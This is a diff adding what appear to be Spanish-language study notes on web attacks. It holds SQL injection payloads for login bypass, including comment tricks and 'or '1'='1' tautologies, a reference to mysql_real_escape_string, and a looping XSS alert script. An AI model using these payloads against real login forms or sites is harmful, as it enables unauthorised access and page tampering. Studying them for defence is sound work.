@@ -42,3 +42,34 @@ SELECT * FROM user -- * FROM configuration;
 
 
 select * from user where (nom_usuario='admin'); --" or usuarios ="admin"; --") and clave ='adcd7048512e64b48a55b027577886ee5a36350'
+
+SELECT * FROM usuarios WHERE =''OR '1'='1'AND clave=''OR '1'='1'
+
+mysql_real_escape_string
+
+
+
+
+SELECT * FROM configuration;
+SELECT * /*ESTO ES UN COMENTARIO*/ FROM configuration;
+SELECT * /*ESTO ES UN COMENTARIO FROM configuracion*/ FROM user;
+SELECT * FROM user -- * FROM configuration;
+
+ select * from user where ( correo="admin" or usuario="admin" )and clave='adcd7048512e64b48a55b027577886ee5a36350' and operativo=1
+
+ select * from user where ( correo="admin"); -- or usuario='admin' and clave='adcd7048512e64b48a55b027577886ee5a36350' and operativo=1
+
+
+select * from user where (nom_usuario='admin'); --" or usuarios ="admin"; --") and clave ='adcd7048512e64b48a55b027577886ee5a36350'
+
+SELECT * FROM usuarios WHERE =''OR '1'='1'AND clave=''OR '1'='1'
+
+mysql_real_escape_string
+
+admin"); -- 
+"or 1=1); -- 
+
+<script>
+setInterval(function(){alert("hacked")},1000</script>
+
+'or '1'='1
